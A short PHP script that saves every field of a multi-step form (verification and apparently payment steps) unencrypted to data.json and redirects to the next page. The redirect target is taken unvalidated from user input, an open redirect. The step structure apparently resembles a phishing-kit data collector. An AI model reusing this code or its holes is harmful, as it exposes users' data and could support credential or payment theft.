<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $bucket_id = $_POST['bucket_id'] ?? null;
    $step = $_POST['step'] ?? null;

    if (!$bucket_id || !$step) {
        echo "Missing bucket_id or step.";
        exit;
    }

    $_SESSION['bucket_id'] = $bucket_id;

    $data_file = 'data.json';
    $data = [];

    if (file_exists($data_file)) {
        $json = file_get_contents($data_file);
        $data = json_decode($json, true) ?: [];
    }

    if (!isset($data[$bucket_id])) {
        $data[$bucket_id] = [];
    }

    // Remove meta fields
    $postData = $_POST;
    // unset($postData['bucket_id'], $postData['step']);

    // $data[$bucket_id]["step_$step"] = $postData;

    // file_put_contents($data_file, json_encode($data, JSON_PRETTY_PRINT));

    // 🔁 Redirect to next step
    $next_page = $_POST['next_page'] ?? null;
    unset($postData['next_page']); // Clean before saving

    // Save data
    $data[$bucket_id]["step_$step"] = $postData;
    file_put_contents($data_file, json_encode($data, JSON_PRETTY_PRINT));

    // Determine next page dynamically based on payment method
 
 
 
    // Save data
    $data[$bucket_id]["step_$step"] = $postData;
    file_put_contents($data_file, json_encode($data, JSON_PRETTY_PRINT));

    // Redirect
    if ($next_page) {
        header("Location: $next_page");
        exit;
    } else {
        switch ($step) {
            case "1":
                header("Location: 3.html");
                break;

            case "2":
                header("Location: verify.html");
                break;
                
                
                  case "3":
                header("Location: 5.html");
                break;
            

            default:
                echo "Unknown step.";
        }
        exit;
    }
}
